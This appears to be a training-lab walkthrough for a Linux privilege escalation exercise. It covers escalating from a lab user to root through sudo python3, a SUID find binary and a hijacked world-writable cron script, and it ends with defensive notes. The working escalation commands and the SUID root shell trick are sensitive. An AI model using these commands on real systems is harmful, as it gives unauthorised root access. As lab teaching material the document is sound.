# 05 — Linux Privilege Escalation

**Objective:** Escalate from `labuser` to `root` on the privesc target.

## Skills practiced

- Sudo misconfigurations
- SUID binary abuse
- World-writable cron job hijacking

## Credentials

| User | Password | Access |
|------|----------|--------|
| labuser | labpassword | SSH on forge-privesc:22 (internal network) |

## Steps

### Via sudo python3

```bash
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
```

### Via SUID binary

```bash
# find_lab has the SUID bit set
/usr/local/bin/find_lab /root -exec /bin/bash -p \; -quit
```

### Via cron job hijack

```bash
# /opt/cleanup.sh is world-writable and runs as root every minute
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
# wait ~1 minute, then:
/tmp/rootbash -p
```

## Flags

- `FLAG{root_privesc_complete}` — readable at `/root/flag.txt` after escalation

## Defensive notes

- Audit `sudo -l` for dangerous NOPASSWD entries
- Never set SUID on general-purpose tools like `find`
- Ensure cron scripts are owned by root and not world-writable
